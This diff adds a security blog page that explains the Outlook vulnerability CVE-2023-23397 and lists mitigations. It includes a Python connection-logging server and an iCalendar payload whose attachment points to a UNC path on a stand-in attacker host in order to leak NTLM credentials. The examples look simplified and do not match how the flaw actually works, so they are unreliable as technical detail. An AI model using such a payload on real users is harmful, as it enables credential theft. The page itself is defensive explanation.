@@ -1,0 +1,113 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>CVE-2023-23397 — Hem Parekh</title>
+<meta name="description" content="CVE-2023-23397" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+<nav>
+  <div class="wrap">
+    <a href="../index.html" class="name">hem parekh</a>
+    <div class="links">
+      <a href="../findings.html">Findings</a>
+      <a href="../projects.html">Projects</a>
+      <a href="../writing.html" class="active">Writing</a>
+      <a href="../about.html">About</a>
+      <a href="mailto:hemparekh1596@gmail.com">Contact</a>
+    </div>
+  </div>
+</nav>
+<article class="article wrap">
+  <a class="back" href="../writing.html">← Writing</a>
+  <div class="amTag">CVE</div>
+  <h1>CVE-2023-23397</h1>
+  <div class="ameta">Sep 8, 2024 &middot; 3 min read</div>
+  <div class="prose">
+<h2>How CVE-2023–23397 Works</h2>
+<p>
+          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
+        </p>
+<h3>Exploit Scenario</h3>
+<ol>
+<li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
+<li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
+<li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
+</ol>
+<h3>Code and Example</h3>
+<div class="code-block">
+<code>
+import http.server<br/>
+import socketserver<br/><br/>
+class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br/>
+    def do_GET(self):<br/>
+        print(f"Received connection from: {self.client_address}")<br/>
+        self.send_response(200)<br/>
+        self.end_headers()<br/>
+        self.wfile.write(b"Hello, you've been logged!")<br/><br/>
+PORT = 8000<br/>
+handler = MyRequestHandler<br/>
+with socketserver.TCPServer(("", PORT), handler) as httpd:<br/>
+    print(f"Serving on port {PORT}")<br/>
+    httpd.serve_forever()<br/>
+</code>
+</div>
+<h3>Malicious Email Payload Example</h3>
+<div class="code-block">
+<code>
+BEGIN:VCALENDAR<br/>
+VERSION:2.0<br/>
+BEGIN:VEVENT<br/>
+UID:123456<br/>
+SUMMARY:Malicious Reminder<br/>
+DTSTART;TZID=Europe/London:20231105T090000<br/>
+ATTACH;VALUE=URI:\\attacker-controlled-server.com\malicious\path<br/>
+END:VEVENT<br/>
+END:VCALENDAR<br/>
+</code>
+</div>
+<h2>Impact and Risks</h2>
+<ul>
+<li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
+<li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
+<li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
+</ul>
+<h2>Mitigation Strategies</h2>
+<ol>
+<li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
+<li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
+<li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
+<li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
+</ol>
+<h3>Defensive Example in PowerShell</h3>
+<div class="code-block">
+<code>
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
+          </code>
+</div>
+<p>
+          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
+        </p>
+  </div>
+  <a class="back" style="margin-top:48px;display:inline-block" href="../writing.html">← All writing</a>
+</article>
+<footer class="wrap">
+  <h2>Have a bug, a role, or a hard parser to read? Get in touch.</h2>
+  <div class="links">
+    <a href="mailto:hemparekh1596@gmail.com">hemparekh1596@gmail.com</a>
+    <a href="https://github.com/Hem1700" target="_blank" rel="noopener">github</a>
+    <a href="https://linkedin.com/in/hem-parekh" target="_blank" rel="noopener">linkedin</a>
+  </div>
+  <div class="fine">&copy; 2026 Hem Parekh</div>
+</footer>
+<script>
+  const io=new IntersectionObserver((es)=>{es.forEach(e=>{if(e.isIntersecting){e.target.classList.add("in");io.unobserve(e.target)}})},{threshold:.12});
+  document.querySelectorAll(".reveal").forEach(el=>io.observe(el));
+</script>
+</body>
+</html>
